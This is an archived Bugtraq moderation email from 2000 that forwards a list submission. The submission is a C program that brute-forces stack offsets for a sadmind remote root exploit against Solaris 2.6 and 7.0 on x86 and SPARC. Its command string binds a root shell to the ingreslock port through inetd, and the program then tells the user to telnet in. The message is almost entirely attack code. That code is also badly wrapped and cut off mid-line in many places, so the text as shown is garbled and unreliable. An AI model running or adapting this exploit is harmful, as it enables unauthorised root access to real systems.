From aleph1@SECURITYFOCUS.COM Fri Nov 10 12:43:31 2000
Date: Fri, 10 Nov 2000 09:50:50 -0800
From: Elias Levy <aleph1@SECURITYFOCUS.COM>
To: vuldb@securityfocus.com
Subject: (forw) BUGTRAQ: approval required (2C2CCEC7)


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/
Si vis pacem, para bellum

    [ Part 2: "Included Message" ]

Date: Fri, 10 Nov 2000 04:35:43 -0800
From: "L-Soft list server at SecurityFocus.com (1.8d)"
    <LISTSERV@LISTS.SECURITYFOCUS.COM>
To: Elias Levy <aleph1@SECURITYFOCUS.COM>
Subject: BUGTRAQ: approval required (2C2CCEC7)

This message was originally submitted by root@SECURITYFOCUS.COM to the BUGTRAQ
list at LISTS.SECURITYFOCUS.COM. You can  approve it using the "OK" mechanism,
ignore it, or repost an edited copy. The message will expire automatically and
you do not need to do anything if you just want to discard it. Please refer to
the list owner's guide if you are  not familiar with the "OK" mechanism; these
instructions  are  being  kept  purposefully short  for  your  convenience  in
processing large numbers of messages.

----------------- Original message (ID=2C2CCEC7) (274 lines) ------------------
Return-Path: <owner-bugtraq@securityfocus.com>
Delivered-To: bugtraq@lists.securityfocus.com
Received: from securityfocus.com (mail.securityfocus.com [207.126.127.78])
	by lists.securityfocus.com (Postfix) with SMTP id 8431D24C489
	for <bugtraq@lists.securityfocus.com>; Fri, 10 Nov 2000 04:35:43 -0800 (PST)
Received: (qmail 22921 invoked by alias); 10 Nov 2000 12:38:11 -0000
Delivered-To: bugtraq@securityfocus.com
Received: (qmail 22918 invoked from network); 10 Nov 2000 12:38:11 -0000
Received: from www3.securityfocus.com (HELO securityfocus.com) (207.126.127.74)
  by mail.securityfocus.com with SMTP; 10 Nov 2000 12:38:11 -0000
Received: (qmail 6375 invoked by uid 103); 10 Nov 2000 12:34:52 -0000
Date: 10 Nov 2000 12:34:52 -0000
Message-ID: <20001110123452.6374.qmail@securityfocus.com>
From: nikolai abromov <minix@antionline.org>
To: bugtraq@securityfocus.com
X-Mailer: Security Focus
Subject: Re: sadmind exploits (remote sparc/x86)
Sender: root@securityfocus.com


brute force offset .... 




// *** Synnergy Networks

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

/* *** ATTENTION *** you may have to change some
of these *** ATTENTION *** */
#define EXPX86          "sadmindex-x86"  /*
sadmind exploit for x86 arch */
#define EXPSPARC        "sadmindex-sparc"  /*
sadmind exploit for sparc arch */
#define INC             4  /* sp brute forcing
incrementation - 4 should be ok

/* DON'T change the following */
#define FALSE           0  /* false */
#define TRUE            !FALSE  /* true */
#define BINDINGRES      "echo 'ingreslock stream
tcp nowait root /bin/sh sh -i'
                                        > /tmp/.x;
/usr/sbin/inetd -s /tmp/.x;
                                        m -f
/tmp/.x;"  /* bind rootshell */
#define SPX8626         0x080418ec  /* default
sadmindex sp for x86 2.6 */
#define SPX867          0x08041798  /* default
sadmindex sp for x86 7.0 */
#define SPSPARC26       0xefff9580  /* default
sadmindex sp for sparc 2.6 */
#define SPSPARC7        0xefff9418  /* default
sadmindex sp for sparc 7.0 */
#define EXPCMDX8626     "./%s -h %s -c \"%s\" -s
0x%x -j 512\n"  /* cmd line */
#define EXPCMDX867      "./%s -h %s -c \"%s\" -s
0x%x -j 536\n"  /* cmd line */
#define EXPCMDSPARC     "./%s -h %s -c \"%s\" -s
0x%x\n"  /* cmd line */

int
main(int argc, char **argv)
{
        int i, sockfd, fd, size = 4096, sign = -1;
        long int addr;
        char *buffer = (char *) malloc (size);
        struct hostent *he;
        struct sockaddr_in their_addr;
        if (argc < 3)
        {
                fprintf(stderr, "\nsadmindex sp
brute forcer - by elux\n");
                fprintf(stderr, "usage: %s [arch]
<host>\n\n", argv[0]);
                fprintf(stderr, "\tarch:\n");
                fprintf(stderr, "\t1 - x86 Solaris
2.6\n");
                fprintf(stderr, "\t2 - x86 Solaris
7.0\n");
                fprintf(stderr, "\t3 - SPARC
Solaris 2.6\n");
                fprintf(stderr, "\t4 - SPARC
Solaris 7.0\n\n");
                exit(TRUE);
        }

        if ( (he = gethostbyname(argv[2])) ==
NULL)
        {
                printf("Unable to resolve %s\n",
argv[2]);
                exit(TRUE);
        }

        their_addr.sin_family = AF_INET;
        their_addr.sin_port = htons(1524);
        their_addr.sin_addr = *((struct in_addr
*)he->h_addr);
        bzero(&(their_addr.sin_zero), 8);

     if ( (strcmp(argv[1], "1")) == 0)
        {
                addr = SPX8626;
                printf("\nAlright... sit back and
relax while this program brut
                for (i = 0; i <= 4096; i += INC)
                {
                        if ( (sockfd =
socket(AF_INET, SOCK_STREAM, 0)) != -1)
                        {
                                if (
(connect(sockfd, (struct sockaddr *)&their
                                {
                                       
fprintf(stderr, "\n\nNow telnet to %s,
                                       
close(sockfd);
                                       
exit(FALSE);
                                }
                        }
                        if ( (fd = open(EXPX86,
O_RDONLY)) != -1)
                        {
                                sign *= -1;
                                addr -= i *sign;
                                snprintf(buffer,
size, EXPCMDX8626, EXPX86, arg
                                system(buffer);
                        }
                        else
                   {
                                printf("\n\n%s
doesn't exisit, you need the sad
                                exit(TRUE);
                        }
                }
        }
        else if ( (strcmp(argv[1], "2")) == 0)
        {
                addr = SPX867;
                printf("\nAlright... sit back and
relax while this program brut
                for (i = 0; i <= 4096; i += INC)
                {
                        if ( (sockfd =
socket(AF_INET, SOCK_STREAM, 0)) != -1)
                        {
                                if (
(connect(sockfd, (struct sockaddr *)&their
                                {
                                       
fprintf(stderr, "\n\nNow telnet to %s,
                                       
close(sockfd);
                                       
exit(FALSE);
                                }
                        }
                        if ( (fd = open(EXPX86,
O_RDONLY)) != -1)
                        {


                             sign *= -1;
                                addr -= i *sign;
                                snprintf(buffer,
size, EXPCMDX867, EXPX86, argv
                                system(buffer);
                        }
                        else
                        {
                                printf("\n\n%s
doesn't exisit, you need the sad
                                exit(TRUE);
                        }
                }
        }
        else if ( (strcmp(argv[1], "3")) == 0)
        {
                addr = SPSPARC26;
                printf("\nAlright... sit back and
relax while this program brut
                for (i = 0; i <= 4096; i += INC)
                {
                        if ( (sockfd =
socket(AF_INET, SOCK_STREAM, 0)) != -1)
                        {
                                if (
(connect(sockfd, (struct sockaddr *)&their
                                {
                                       
fprintf(stderr, "\n\nNow telnet to %s,
                          close(sockfd);
                                       
exit(FALSE);
                                }
                        }
                        if ( (fd = open(EXPSPARC,
O_RDONLY)) != -1)
                        {
                                sign *= -1;
                                addr -= i *sign;
                                snprintf(buffer,
size, EXPCMDSPARC, EXPSPARC, a
                                system(buffer);
                        }
                        else
                        {
                                printf("\n\n%s
doesn't exisit, you need the sad
                                exit(TRUE);
                        }
                }
        }
        else if ( (strcmp(argv[1], "4")) == 0)
        {
                addr = SPSPARC7;   
                printf("\nAlright... sit back and
relax while this program brut
                for (i = 0; i <= 4096; i += INC)
     {
                        if ( (sockfd =
socket(AF_INET, SOCK_STREAM, 0)) != -1)
                        {
                                if (
(connect(sockfd, (struct sockaddr *)&their
                                {  
                                       
fprintf(stderr, "\n\nNow telnet to %s,
                                       
close(sockfd);
                                       
exit(FALSE);
                                }  
                        }
                        if ( (fd = open(EXPSPARC,
O_RDONLY)) != -1)
                        {
                                sign *= -1;
                                addr -= i *sign;
                                snprintf(buffer,
size, EXPCMDSPARC, EXPSPARC, a
                                system(buffer);
                        }
                        else
                        {
                                printf("\n\n%s
doesn't exisit, you need the sad
                                exit(TRUE);
                        }
                }

        }
        else
                printf("%s is not a supported
arch, try 1 - 4 ... .. .\n", argv
}

// EOF
